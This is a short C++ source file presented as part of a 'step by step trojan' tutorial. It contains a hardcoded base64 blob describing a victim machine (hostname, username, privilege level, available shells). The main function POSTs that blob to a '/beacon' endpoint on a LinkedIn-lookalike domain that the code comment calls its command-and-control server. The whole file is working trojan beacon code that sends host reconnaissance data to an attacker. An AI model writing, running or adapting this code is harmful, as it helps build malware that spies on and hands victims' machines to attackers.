// A step by step trojan www.grantknoetze.com

#include "Main.h"

using namespace std;


const char* Params = "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ == ";
int main()
{
	HINTERNET hSession = SendRequest("www.linkedinsolutions.link", 80, "/beacon", "POST", Params); // Send request to our C&C domain.
	if (hSession) {
		printf("Data has been sent successfully\n");
	}
	else {
		printf("Error in sending data\n");
	}

}